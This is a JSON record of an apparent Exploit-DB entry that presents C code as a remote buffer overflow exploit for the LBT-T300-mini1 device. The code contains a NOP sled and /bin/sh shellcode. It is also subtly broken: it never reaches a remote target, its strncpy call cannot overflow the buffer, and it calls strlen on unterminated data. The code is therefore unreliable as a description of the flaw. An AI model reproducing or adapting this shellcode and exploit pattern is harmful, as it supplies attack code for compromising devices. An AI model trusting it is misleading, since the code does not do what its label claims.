{"source": "https://www.exploit-db.com/exploits/51922", "vulnName": "LBT-T300-mini1 - Remote Buffer Overflow", "vulnEDBID": "51922", "vulnCVE": "N/A", "author": "AMIRHOSSEIN BAHRAMIZADEH", "exploitType": "REMOTE", "platform": "LINUX", "datePublished": "2024-03-25", "vulnContent": "#include <stdio.h>\n#include <string.h>\n\n#define MAX_LEN 256\n#define BUFFER_OVERRUN_LENGTH 50\n#define SHELLCODE_LENGTH 32\n\n// NOP sled to increase the chance of successful shellcode execution\nchar nop_sled[SHELLCODE_LENGTH] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\";\n\n// Shellcode to execute /bin/sh\nchar shellcode[SHELLCODE_LENGTH] = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n\nvoid apply_cgi(char *vpn_client_ip) {\n    char buffer[MAX_LEN];\n    strncpy(buffer, vpn_client_ip, MAX_LEN);\n    printf(\"Client IP: %s\\n\", buffer);\n}\n\nint main() {\n    char input[MAX_LEN + BUFFER_OVERRUN_LENGTH] = {0};\n    // Create a buffer with the malicious input\n    // including the NOP sled, shellcode, and the overflow data\n    int offset = strlen(nop_sled) + strlen(shellcode) - BUFFER_OVERRUN_LENGTH;\n    strncpy(&input[0], nop_sled, offset);\n    strncpy(&input[offset], shellcode, SHELLCODE_LENGTH);\n    input[MAX_LEN + BUFFER_OVERRUN_LENGTH - 1] = '\\x00';\n    // Call the vulnerable function to trigger the buffer overflow\n    apply_cgi(input);\n    return 0;\n}\n            "}